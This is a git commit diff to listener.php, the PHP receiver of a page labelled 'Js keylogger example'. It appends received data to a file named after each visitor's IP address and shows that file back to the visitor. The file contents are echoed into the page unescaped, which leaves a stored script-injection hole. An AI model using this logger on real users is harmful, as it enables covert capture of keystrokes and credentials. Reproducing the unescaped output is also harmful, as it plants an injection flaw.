560cb8326846532ccd84d2414d157df7f0e2e15c
XeroCodeIT <pmaldw@hotmail.com>
2014-04-10 19:14:13 +0300

    Update listener.php

--- listener.php
+++ listener.php
@@ -1,3 +1,10 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name= "robots" content = "noindex, nofollow" />
+  <title>Js keylogger example</title>
+</head>
+<body>
 <?php
 $myFile = $_SERVER['REMOTE_ADDR'].".txt";
 $fh = fopen($myFile, 'a') or die("can't open file");
@@ -9,3 +16,14 @@ $s='';
 fwrite($fh, $s);
 fclose($fh);
 ?>
+
+Faila, kurs atbilst Jusu datora IP adresei, saturs: <?php echo $_SERVER['REMOTE_ADDR'] ?>.txt <br /><br />
+
+<div style="width:700px; background-color: #ccc; word-break: break-all; height: auto;">
+<?php
+echo file_get_contents($myFile);
+?>
+</div>
+
+</body>
+</html>
